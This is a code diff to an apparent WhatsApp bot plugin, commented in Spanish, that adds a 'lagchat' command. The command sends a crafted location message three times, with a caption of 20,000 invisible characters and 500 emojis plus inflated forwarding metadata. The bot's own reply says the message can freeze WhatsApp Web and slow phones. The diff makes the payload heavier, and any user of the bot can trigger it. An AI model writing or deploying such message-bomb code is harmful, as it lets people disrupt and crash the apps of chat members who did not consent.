@@ -4,15 +4,15 @@ const buildLagMessage = () => ({
       liveLocationMessage: {
         degreesLatitude: '💣',
         degreesLongitude: '💥',
-        caption: ('\uFFFF\uFFFE\u2063💥').repeat(7000), // mezcla caracteres ilegales y ocultos
-        sequenceNumber: '999999',
-        jpegThumbnail: Buffer.alloc(1024, 0), // miniatura ligera
+        caption: '\u2063'.repeat(20000) + '💥'.repeat(500), // más invisibles y más emojis
+        sequenceNumber: String(Math.floor(Math.random() * 100000)),
+        jpegThumbnail: null,
         contextInfo: {
           forwardingScore: 9999,
           isForwarded: true,
           externalAdReply: {
-            title: '💣 Super Lag WhatsApp',
-            body: 'Mensaje con caracteres ilegales',
+            title: '💣 Lag Extremo',
+            body: 'Mensaje pesadísimo',
             mediaType: 1,
             renderLargerThumbnail: true,
             showAdAttribution: true,
@@ -26,9 +26,9 @@ const buildLagMessage = () => ({
 
 let handler = async (m, { conn }) => {
   const jid = m.chat
-  const times = 3
+  const times = 3 // más envíos para prolongar el lag
 
-  await m.reply(`⚠️ Enviando ${times} super bombas al chat...`)
+  await m.reply(`⚠️ Enviando ${times} bombas al chat...\nEsto puede congelar WhatsApp Web y móviles lentos.`)
 
   for (let i = 0; i < times; i++) {
     try {
@@ -36,15 +36,16 @@ let handler = async (m, { conn }) => {
       await new Promise(resolve => setTimeout(resolve, 200))
     } catch (error) {
       console.error('Error al enviar mensaje:', error)
-      await m.reply('❗ Error al enviar mensaje.')
+      await m.reply('❗ Ocurrió un error al enviar el mensaje.')
       return
     }
   }
 
-  await m.reply('✅ *Lagchat super debil enviado.*')
+  await m.reply('✅ *Lagchat completo.*')
 }
 
 handler.command = /^lagchat$/i
 handler.owner = false
+
 
 export default handler
